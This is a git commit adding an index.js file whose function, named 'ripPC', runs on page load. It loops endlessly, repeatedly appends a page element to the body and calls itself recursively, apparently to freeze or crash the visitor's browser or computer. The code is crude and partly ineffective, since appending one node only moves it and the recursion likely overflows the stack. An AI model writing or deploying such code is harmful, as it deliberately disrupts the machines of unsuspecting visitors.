06093d1cbaeb5f4317c9784dc07974004fc6b138
Gigached <smallgigached@gmail.com>
2024-09-11 23:38:45 +0500

    last commit

---
+++ index.js
@@ -0,0 +1,26 @@
+function ripPC() {
+  
+	for (;;) {
+				let img =  document.querySelector('.zxc')
+				document.body.append(img)
+				document.body.append(img)
+				document.body.append(img)
+				document.body.append(img)
+				document.body.append(img)
+				document.body.append(img)
+				document.body.append(img)
+				document.body.append(img)
+				document.body.append(img)
+				document.body.append(img)
+
+				document.body.append(img)
+				document.body.append(img)
+				document.body.append(img)
+				document.body.append(img)
+
+				
+	console.log(Math.random() * 999999999999999999999999);
+	return ripPC()
+}
+}
+ripPC()
